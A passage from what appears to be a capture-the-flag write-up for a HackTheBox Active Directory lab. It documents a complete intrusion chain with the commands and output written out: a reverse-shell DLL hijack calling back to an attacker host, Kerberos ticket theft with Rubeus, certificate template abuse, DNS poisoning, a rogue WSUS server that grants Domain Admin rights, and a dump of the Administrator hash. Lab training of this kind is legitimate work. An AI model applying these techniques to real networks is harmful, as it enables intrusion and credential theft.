This behavior introduces a potential DLL hijacking opportunity. Since the application extracts files from a ZIP archive and subsequently loads a DLL by name from the extracted contents, an attacker who can influence the update process could supply a malicious `settings_update.dll` inside a crafted `Settings_Update.zip` archive. When `UpdateMonitor.exe` performs its update routine, the malicious DLL would be loaded and its `PreUpdateCheck` function executed automatically, providing a potential path to code execution in the security context of the user or service running the application.

At this point, the next objective was to determine whether the compromised account had the ability to interact with the update mechanism by writing files to the monitored directory.

```powershell
*Evil-WinRM* PS C:\Users\jaylee.clifton> icacls "C:\ProgramData\UpdateMonitor"
C:\ProgramData\UpdateMonitor NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                             BUILTIN\Users:(I)(OI)(CI)(RX)
                             BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Successfully processed 1 files; Failed processing 0 files
```

Examining the ACLs on `C:\ProgramData\UpdateMonitor` revealed an interesting permission assigned to the **Users** group: `(WD, AD, WEA, WA)`, which grants the ability to create files and write data within the directory. Although `Settings_Update.zip` did not currently exist, these permissions indicated that any authenticated user, including our compromised account, could create it in the watched location.

This finding is particularly important because `UpdateMonitor.exe` explicitly checks for the presence of `C:\ProgramData\UpdateMonitor\Settings_Update.zip` before extracting its contents and loading `settings_update.dll`. As a result, we have a path to supply our own update package and potentially influence the application's behavior. Additionally, the application contains a hardcoded log file location at `C:\ProgramData\UpdateMonitor\Logs\monitor.log`, which provides a convenient way to verify whether the update process executed successfully.

The next step was to craft a malicious `settings_update.dll` using `msfvenom` and package it inside a `Settings_Update.zip` archive

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.52 LPORT=4444 -a x86 --platform windows -f dll -o settings_update.dll
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
Saved as: settings_update.dll

┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ zip Settings_Update.zip settings_update.dll
updating: settings_update.dll (deflated 82%)
```

After generating the payload and compressing it into a ZIP archive, I uploaded `Settings_Update.zip` to `C:\ProgramData\UpdateMonitor`, the directory monitored by the update service.

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip
                                        
Info: Uploading /home/blxckwolf/HTB/Logging/Settings_Update.zip to C:\ProgramData\UpdateMonitor\Settings_Update.zip
                                        
Data: 2424 bytes of 2424 bytes copied
                                        
Info: Upload successful!
```

Once the archive was in place, I started a listener in `metasploit` and waited for the update process to execute.

```shell
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.52
LHOST => 10.10.14.52
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.52:4444
```

Shortly afterward, a reverse shell connection was received, indicating that the application had detected the archive, extracted its contents, and loaded the malicious DLL as expected. Inspecting the session revealed that the code was executed as `logging\jaylee.clifton`, successfully transitioning from the `MSA_HEALTH$` service account to a user belonging to the **IT** group. This confirmed both the DLL hijacking vulnerability and the ability to leverage it for lateral movement to a more privileged account within the environment.

```shell
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.52:443 
[*] Command shell session 22 opened (10.10.14.52:443 -> 10.129.1.42:50990) at 2026-07-07 09:59:00 -0400


Shell Banner:
Microsoft Windows [Version 10.0.17763.8644]
-----
          

C:\Windows\system32>whoami
logging\jaylee.clifton
```

A quick inspection of `C:\Users\jaylee.clifton\Desktop` reveals the user flag stored in `user.txt`.

## Domain Enumeration via Kerberos Ticket Abuse

To impersonate `jaylee.clifton` and continue the attack path, the first step was obtaining his Ticket Granting Ticket (TGT). A valid TGT allows us to authenticate as the target user within the Active Directory environment and perform Kerberos-based operations without needing the user's password.

It's time to `Rubeus` for this.

```powershell
*Evil-WinRM* PS C:\ProgramData> upload Rubeus.exe
                                        
Info: Uploading /home/blxckwolf/HTB/Logging/Rubeus.exe to C:\ProgramData\Rubeus.exe
                                        
Data: 687444 bytes of 687444 bytes copied
                                        
Info: Upload successful!
```

Using `Rubeus`, I first enumerated the current Kerberos tickets available on the compromised host to confirm the presence of `jaylee.clifton`'s TGT. The ticket information showed an active `krbtgt/LOGGING.HTB` ticket associated with the user.

```powershell
C:\ProgramData>.\Rubeus.exe triage
.\Rubeus.exe triage

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x10d5e2

 --------------------------------------------------------------------------------------- 
 | LUID     | UserName                     | Service            | EndTime              |
 --------------------------------------------------------------------------------------- 
 | 0x10d5e2 | jaylee.clifton @ LOGGING.HTB | krbtgt/LOGGING.HTB | 7/7/2026 11:59:15 PM |
 --------------------------------------------------------------------------------------- 

```

Next, Rubeus was used with the `tgtdeleg` action to request a delegated TGT from the current user's Kerberos session. This successfully extracted the ticket in `.kirbi` format, which was then transferred to our machine for further processing.

```powershell
C:\ProgramData>.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: B5QvloLlOcy6XUi2oG9rsivrXhkBJKgbYFMVjMOT9Bo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuUjr95zjpgu6Pnbr3bY+b5AZ8PH8HTEzNdhtzybJSi5Vu8D2LCJOR0nYhXMo95TXKPBtT2OPxT+sn17kA+85GqzmKty5PPE/d2TLmbV1BKckqBJEYshY/LTWB1P0mXZoj024fe1oYbSPyL8jCc/9m1Ry4Ti53DwV/ukoDtclF0ZD/GPNz/9Fpr0iUhTxYvSCJPEiU1NABEorVc1N7UDEE6EM4q3+xCzcMCBD0+Y3pn0oQ4ru2/PjvLbKbFw2Iq6Od7+ssjR1bNzQQeRQ1eN+5DruUIGseaMXoAHnfM3dwuDPN+NI3QRMv1JL3IoF4nRTanPZj0MLxjOTxSkxtgye9BrWnQujcSq7sVGA+xJC1WhR6DT44f8pew51GV+4lGt5HbVLPTOvv5Gr9Fao5hTQQvGCM9XgYOH7PF2PdsjcIW3Uqw9CCVz6lORLw/OHF4CfHXkI+xHw4Sv48kxjc9RKuXQLB0PLJhAXESvK2720l+JHboezjciCa68TkVmQqX+YpRiqGNghF5ER/wtSDWeGH0K6QiGZLhTBcI05OgfSqMDyx8NfEOeEtT+QCerqXKHlOMLWk9E9ykKbdqVAsawCqLfrDqfC9nGOc2HZZDCWY9elur0pK85XpO+PGagHLPx2E4xjzKE7BSqk+0Hzqc2m+XDI2Nd6CFQsaK5jf8Yn3HjgoglTwfdCIzykKfZ9ogwNvCncY60/Xzn54jTWXrw9yd+l68t9vMlEd0klvzbQJ0PFSeSbF9+FwvjNlJ0RW8QDBuANQePf0Z6Urb/t2uOPw9I55/0Az/c/AK+RUC9sxM8/zJt7m7/E1siTio6W1IO1UYAtWcSavEV48Oqc0E4mB5SSAYp8eqgN8tQ6CCl04hPbecIUYrxPPdbCF1QVNA29W/1YZUcd+hN/bxIvFWgwTLLinSan0xHY+tRJxwnDxDhICxpIIOjE+buaHyigRoJvHNoPXSGO9PgA90fi/Mg7hrXQzIKty0IlYYTmPAlFmN1jzlVxYAHB9yD8wFk3dU0EsLxAJTpz2Xokw3xHGtunqeBTTUy3OZfCwgY/o0neBTfEhutSLPw3NIjyDX5ib7hAKg8mRGcUx5pzX/vBmgk1rMp8jV7JWCEf9Axlc9TyEFyPVwdNHMp+qjBVhMoFQ3ybqKOdlWOHzx3xZuv6HAp472RYm2pGi9rnQ/wtbO1cHMycyRJzWxTCnFysRUjmUk/cspiJAuZvbb2DA+9CYWTx6TLduk/zuRKuDDgERgsZYIfTepbL8nB91ifzdvhO3/gdt/UtzRlOUEAFgmajo6KiifWsKXGl4mH8yEJkelWUA1Cka6KWgx3uruApUT9DRvsPKWEm20ky3e2Lr+YWqUEmy3Fp5efzVNALs5wPu9jrKCaznSuywzTQLMI8a9t9ZMkj4niEULVY+pWct+wjquVJ3exrCjNPDgTt6yIdgs7cxWbEaq0vqwPNGAElIFDBv8Wt0ds7+ba7fzrL7pIC6rpehG6zD5VGtyiSRsSD+P2jOo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgSQJoozeo7CSDOgJEP5Oy0zl8Pux2In3BMrw7EQJcsRShDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDcwNzIxMDczNlqmERgPMjAyNjA3MDgwNjU5MTVapxEYDzIwMjYwNzE0MjA1OTE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=
```

Since Impacket tools require Kerberos tickets in `ccache` format, the extracted `.kirbi` ticket was converted using `impacket-ticketConverter`. The resulting `jaylee.ccache` file can now be used with Kerberos authentication, allowing further enumeration and exploitation while operating under the identity of `jaylee.clifton`.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ echo "doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuUjr95zjpgu6Pnbr3bY+b5AZ8PH8HTEzNdhtzybJSi5Vu8D2LCJOR0nYhXMo95TXKPBtT2OPxT+sn17kA+85GqzmKty5PPE/d2TLmbV1BKckqBJEYshY/LTWB1P0mXZoj024fe1oYbSPyL8jCc/9m1Ry4Ti53DwV/ukoDtclF0ZD/GPNz/9Fpr0iUhTxYvSCJPEiU1NABEorVc1N7UDEE6EM4q3+xCzcMCBD0+Y3pn0oQ4ru2/PjvLbKbFw2Iq6Od7+ssjR1bNzQQeRQ1eN+5DruUIGseaMXoAHnfM3dwuDPN+NI3QRMv1JL3IoF4nRTanPZj0MLxjOTxSkxtgye9BrWnQujcSq7sVGA+xJC1WhR6DT44f8pew51GV+4lGt5HbVLPTOvv5Gr9Fao5hTQQvGCM9XgYOH7PF2PdsjcIW3Uqw9CCVz6lORLw/OHF4CfHXkI+xHw4Sv48kxjc9RKuXQLB0PLJhAXESvK2720l+JHboezjciCa68TkVmQqX+YpRiqGNghF5ER/wtSDWeGH0K6QiGZLhTBcI05OgfSqMDyx8NfEOeEtT+QCerqXKHlOMLWk9E9ykKbdqVAsawCqLfrDqfC9nGOc2HZZDCWY9elur0pK85XpO+PGagHLPx2E4xjzKE7BSqk+0Hzqc2m+XDI2Nd6CFQsaK5jf8Yn3HjgoglTwfdCIzykKfZ9ogwNvCncY60/Xzn54jTWXrw9yd+l68t9vMlEd0klvzbQJ0PFSeSbF9+FwvjNlJ0RW8QDBuANQePf0Z6Urb/t2uOPw9I55/0Az/c/AK+RUC9sxM8/zJt7m7/E1siTio6W1IO1UYAtWcSavEV48Oqc0E4mB5SSAYp8eqgN8tQ6CCl04hPbecIUYrxPPdbCF1QVNA29W/1YZUcd+hN/bxIvFWgwTLLinSan0xHY+tRJxwnDxDhICxpIIOjE+buaHyigRoJvHNoPXSGO9PgA90fi/Mg7hrXQzIKty0IlYYTmPAlFmN1jzlVxYAHB9yD8wFk3dU0EsLxAJTpz2Xokw3xHGtunqeBTTUy3OZfCwgY/o0neBTfEhutSLPw3NIjyDX5ib7hAKg8mRGcUx5pzX/vBmgk1rMp8jV7JWCEf9Axlc9TyEFyPVwdNHMp+qjBVhMoFQ3ybqKOdlWOHzx3xZuv6HAp472RYm2pGi9rnQ/wtbO1cHMycyRJzWxTCnFysRUjmUk/cspiJAuZvbb2DA+9CYWTx6TLduk/zuRKuDDgERgsZYIfTepbL8nB91ifzdvhO3/gdt/UtzRlOUEAFgmajo6KiifWsKXGl4mH8yEJkelWUA1Cka6KWgx3uruApUT9DRvsPKWEm20ky3e2Lr+YWqUEmy3Fp5efzVNALs5wPu9jrKCaznSuywzTQLMI8a9t9ZMkj4niEULVY+pWct+wjquVJ3exrCjNPDgTt6yIdgs7cxWbEaq0vqwPNGAElIFDBv8Wt0ds7+ba7fzrL7pIC6rpehG6zD5VGtyiSRsSD+P2jOo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgSQJoozeo7CSDOgJEP5Oy0zl8Pux2In3BMrw7EQJcsRShDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDcwNzIxMDczNlqmERgPMjAyNjA3MDgwNjU5MTVapxEYDzIwMjYwNzE0MjA1OTE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=" | base64 -d > jaylee.kirbi

┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ impacket-ticketConverter jaylee.kirbi jaylee.ccache                                         
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

After obtaining `jaylee.clifton`'s Kerberos ticket, the next step was to identify any Active Directory objects where the user has modification rights. By setting the Kerberos credential cache and querying writable objects with `bloodyAD`, we can enumerate potential privilege escalation paths.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ export KRB5CCNAME=jaylee.ccache   

┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ bloodyad -H dc01.logging.htb -d logging.htb -u 'jaylee.clifton' -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=jaylee.clifton,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

The results show that `jaylee.clifton` has write permissions over multiple objects, including the DNS integration zones:

```text
distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

This permission allows `jaylee.clifton` to create new DNS records inside the Active Directory-integrated DNS zone. Since several Windows services rely on DNS-based trust relationships, controlling DNS records can be leveraged to impersonate internal services.

## ADCS Exploitation via Vulnerable UpdateSrv Certificate Template

To further enumerate possible attack paths, I used `Certipy-ad` to inspect the Active Directory Certificate Services (ADCS) configuration and identify vulnerable certificate templates.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ certipy-ad find -u 'jaylee.clifton' -k -target DC01.logging.htb -dc-host DC01.logging.htb -dc-ip "10.129.1.42" -enabled
[sudo] password for blxckwolf: 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'logging-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'logging-DC01-CA'
[*] Checking web enrollment for CA 'logging-DC01-CA' @ 'DC01.logging.htb'
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260707101327_Certipy.txt'
[*] Wrote text output to '20260707101327_Certipy.txt'
[*] Saving JSON output to '20260707101327_Certipy.json'
[*] Wrote JSON output to '20260707101327_Certipy.json'
```

Now let's check the output.

```JSON
"Certificate Templates": {
    "0": {
      "Template Name": "UpdateSrv",
      "Display Name": "UpdateSrv",
      "Certificate Authorities": [
        "logging-DC01-CA"
      ],
      "Enabled": true,
      "Client Authentication": false,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        1
      ],
      "Extended Key Usage": [
        "Server Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 2,
      "Validity Period": "10 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2026-04-17 00:41:06+00:00",
      "Template Last Modified": "2026-04-17 00:41:07+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "LOGGING.HTB\\IT",
            "LOGGING.HTB\\Domain Admins",
            "LOGGING.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "LOGGING.HTB\\Administrator",
          "Full Control Principals": [
            "LOGGING.HTB\\Domain Admins",
            "LOGGING.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "LOGGING.HTB\\Domain Admins",
            "LOGGING.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "LOGGING.HTB\\Domain Admins",
            "LOGGING.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "LOGGING.HTB\\Domain Admins",
            "LOGGING.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "LOGGING.HTB\\IT"
      ]
    }
```

The enumeration revealed an interesting certificate template named `UpdateSrv`. This template has several notable properties:

* `Enrollee Supplies Subject` is enabled, allowing the requester to specify the certificate identity.
* The certificate includes the `Server Authentication` Extended Key Usage (EKU).
* The template is available for enrollment by members of the `IT` group, which `jaylee.clifton` belongs to.

These permissions create a potential ESC17-style attack scenario. By abusing the `UpdateSrv` template, `jaylee.clifton` can request a valid server authentication certificate for an arbitrary hostname.

The attack chain relies on abusing the trust relationship between domain clients and the internal **WSUS server**. WSUS allows organizations to manage Windows updates internally, and clients trust the configured WSUS endpoint to provide update packages. If an attacker can impersonate the WSUS server, they can potentially deliver malicious update packages that execute with SYSTEM privileges.

In this case, the required conditions are satisfied:

1. The `UpdateSrv` certificate template allows the requester to specify a custom subject name.
2. The certificate supports Server Authentication, allowing it to impersonate a legitimate HTTPS service.
3. `jaylee.clifton` can create DNS records within the AD-integrated DNS zone.
4. The WSUS hostname can be redirected to an attacker-controlled system.

The resulting attack path is:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5rVyVw01hI5T0Z7msjjl%252FWSUS%2520AttackChain.png%3Falt%3Dmedia%26token%3D8f59a063-5d4f-4e7d-b21e-44791217246c&width=768&dpr=3&quality=100&sign=bb58e38&sv=2)

By combining ADCS abuse with DNS control, it becomes possible to impersonate the trusted WSUS endpoint and escalate privileges within the domain environment.

Although the WSUS server was successfully identified, direct interaction through SharpWSUS was not possible because `jaylee.clifton` was not a member of the WSUS Administrators group. Attempting to inspect the WSUS configuration resulted in authentication failures against the backend database, preventing traditional WSUS management operations.

```powershell
C:\Temp>.\SharpWSUS.exe inspect
.\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

Function error - FsqlConnection.
Error Message: Login failed for user 'logging\jaylee.clifton'.

Function error - FbGetWSUSConfigSQL.
Error Message: ExecuteReader: Connection property has not been initialized.

####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------

Function error - FbEnumAllComputers.
Error Message: ExecuteReader: Connection property has not been initialized.

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

Function error - FbEnumDownStream.
Error Message: ExecuteReader: Connection property has not been initialized.

####################### Group Enumeration #######################
GroupName
---------------------------------------------------

Function error - FbEnumGroups.
Error Message: ExecuteReader: Connection property has not been initialized.

[*] Inspect complete
```

However, the previously discovered `UpdateSrv` certificate template provided an alternative attack path. Since the template allows members of the `IT` group to enroll certificates with an arbitrary subject name and includes the `Server Authentication` EKU, it can be abused to obtain a valid TLS certificate for the trusted WSUS hostname.

## WSUS Server Impersonation via Rogue Certificate Enrollment

Using `Certipy-ad`, a certificate was requested for `wsus.logging.htb` through the vulnerable template:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ certipy-ad req -u 'jaylee.clifton@logging.htb' -k -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip "10.129.1.42" -ca 'logging-DC01-CA' -template 'UpdateSrv' -dns 'wsus.logging.htb'
 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'wsus.pfx'
[*] Wrote certificate and private key to 'wsus.pfx'
```

The certificate request was successful and produced a PFX file containing both the certificate and private key. This certificate would later be used to impersonate the legitimate WSUS server over HTTPS.

To prepare the certificate for use with `wsuks`, the PFX file was separated into certificate and private key components before being merged into a PEM bundle.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ certipy-ad cert -pfx wsus.pfx -nokey -out wsus.crt && certipy-ad cert -pfx wsus.pfx -nocert -out wsus.key
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Data written to 'wsus.crt'
[*] Writing certificate to 'wsus.crt'
                                                                                                                                            
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Data written to 'wsus.key'
[*] Writing private key to 'wsus.key'

┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ cat wsus.crt wsus.key > wsus.pem 
```

## DNS Hijacking via CREATE\_CHILD Permissions

At this point, the certificate alone was not sufficient. Clients also needed to resolve `wsus.logging.htb` to my system. Earlier enumeration revealed that `jaylee.clifton` possessed `CREATE_CHILD` permissions on the Active Directory-integrated DNS zone, allowing new DNS records to be created.

Using `bloodyAD`, a malicious DNS record was added:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ bloodyad -H DC01.logging.htb -d logging.htb -u 'jaylee.clifton' -k add dnsRecord 'wsus' "10.10.14.52"

[+] wsus has been successfully added
```

This caused `wsus.logging.htb` to resolve to the attacker's machine while still matching the certificate previously obtained from ADCS. As a result, both DNS resolution and TLS validation now pointed clients toward the rogue server.

```powershell
C:\Temp>nslookup wsus.logging.htb
nslookup wsus.logging.htb
Server:  localhost
Address:  127.0.0.1

Name:    wsus.logging.htb
Address:  10.10.14.52
```

## Domain Compromise via Malicious WSUS Update Deployment

With the DNS record and trusted certificate in place, I launched a malicious HTTPS WSUS server using `wsuks`. The server was configured to deliver a payload that executed a PowerShell command as `SYSTEM`, adding the computer account `MSA_HEALTH$` to the `Domain Admins` group.

When domain clients contacted the spoofed WSUS server, the logs confirmed successful interaction with the Windows Update protocol. Requests such as `GetConfig`, `SyncUpdates`, and `GetExtendedUpdateInfo`, followed by the download of `PsExec64.exe`, demonstrated that the client trusted the rogue WSUS infrastructure and accepted the malicious update.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ echo "10.10.14.52 wsus.logging.htb" | sudo tee -a /etc/hosts
10.10.14.52 wsus.logging.htb

┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ sudo wsuks --serve-only --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'


    __          __ _____  _    _  _  __  _____
    \ \        / // ____|| |  | || |/ / / ____|
     \ \  /\  / /| (___  | |  | || ' / | (___
      \ \/  \/ /  \___ \ | |  | ||  <   \___ \
       \  /\  /   ____) || |__| || . \  ____) |
        \/  \/   |_____/  \____/ |_|\_\|_____/

     Pentesting Tool for the WSUS MITM Attack
               Made by NeffIsBack
                 version: 1.2.1

[+] Command to execute: 
PsExec64.exe /accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""                                                                                    
[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 10.10.14.52:8531...
[*] Serving executable as KB: 1193337
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"
[+] Received GET request: /33cb2220-45c6-4fbd-ab38-30d082e4d00d/PsExec64.exe
[+] GET request for exe: /33cb2220-45c6-4fbd-ab38-30d082e4d00d/PsExec64.exe
[+] Received GET request: /33cb2220-45c6-4fbd-ab38-30d082e4d00d/PsExec64.exe
[+] GET request for exe: /33cb2220-45c6-4fbd-ab38-30d082e4d00d/PsExec64.exe
```

Once the payload executed, the previously compromised `MSA_HEALTH$` account inherited Domain Admin privileges. The account now possessed numerous high-privilege rights, including administrative and delegation-related privileges typically associated with domain administrators.

```powershell
*Evil-WinRM* PS C:\Users\msa_health$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

With Domain Admin access achieved, I used `impacket-secretsdump` to extract credential material from the domain controller. This revealed the NTLM hash of the built-in `Administrator` account.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ impacket-secretsdump -hashes :603fc24ee01a9409f83c9d1d701485c5 'logging.htb/msa_health$@dc01.logging.htb'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x36936928a3ec7aa076d5b89ac8d4a1c1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
